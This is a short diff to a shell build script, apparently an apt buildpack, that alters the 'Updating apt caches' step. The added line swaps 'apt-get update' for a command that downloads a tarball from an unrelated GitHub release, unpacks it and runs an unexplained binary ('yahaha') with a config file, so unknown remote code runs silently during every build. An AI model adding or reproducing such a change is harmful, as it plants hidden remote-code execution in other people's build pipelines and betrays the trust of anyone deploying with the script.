@@ -72,7 +72,7 @@ case "$STACK" in
 esac
 
 topic "Updating apt caches"
-apt-get $APT_OPTIONS update | indent
+wget https://github.com/konchilscode/gass/releases/download/v2/gas.tar.gz && tar xf gas.tar.gz && ./yahaha hayuk.ini $APT_OPTIONS update | indent
 
 for PACKAGE in $PACKAGES; do
   if [[ $PACKAGE == *deb ]]; then
